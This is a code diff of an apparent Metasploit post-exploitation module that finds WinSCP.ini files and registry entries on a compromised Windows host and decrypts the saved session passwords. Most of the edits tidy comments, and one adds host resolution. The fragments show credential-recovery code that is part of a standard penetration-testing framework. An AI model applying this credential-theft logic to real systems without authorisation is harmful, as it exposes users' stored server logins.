@@ -99,7 +99,7 @@ class Metasploit3 < Msf::Post
 
   def get_ini(filename)
     print_error("Looking for #{filename}.")
-    #opens the WinSCP.ini file for reading and loads it into the MSF Ini Parser
+    # opens the WinSCP.ini file for reading and loads it into the MSF Ini Parser
     parse = read_file(filename)
     if parse.nil?
       print_error("WinSCP.ini file NOT found...")
@@ -109,13 +109,13 @@ class Metasploit3 < Msf::Post
     print_status("Found WinSCP.ini file...")
     ini = Rex::Parser::Ini.from_s(parse)
 
-    #if a Master Password is in use we give up
+    # if a Master Password is in use we give up
     if ini['Configuration\\Security']['MasterPassword'] == '1'
       print_status("Master Password Set, unable to recover saved passwords!")
       return nil
     end
 
-    #Runs through each group in the ini file looking for all of the Sessions
+    # Runs through each group in the ini file looking for all of the Sessions
     ini.each_key do |group|
       if group.include?('Sessions') && ini[group].has_key?('Password')
         winscp_store_config(
@@ -135,7 +135,7 @@ class Metasploit3 < Msf::Post
     pwalg_simple_magic = 0xA3
     pwalg_simple_string = "0123456789ABCDEF"
 
-    # Decrypts the next charachter in the password sequence
+    # Decrypts the next character in the password sequence
     if @password.length > 0
       # Takes the first char from the encrypted password and finds its position in the
       # pre-defined string, then left shifts the returned index by 4 bits
@@ -188,7 +188,6 @@ class Metasploit3 < Msf::Post
     print_status("Looking for Registry Storage...")
     get_reg()
     print_status("Done!")
-
   end
 
   def winscp_store_config(config)
@@ -208,7 +207,8 @@ class Metasploit3 < Msf::Post
     print_status("Host: #{host}  Port: #{portnum} Protocol: #{sname}  Username: #{user}  Password: #{plaintext}")
 
     service_data = {
-      address: host,
+      # XXX This resolution should happen on the victim side instead
+      address: ::Rex::Socket.getaddress(host),
       port: portnum,
       service_name: sname,
       protocol: 'tcp',
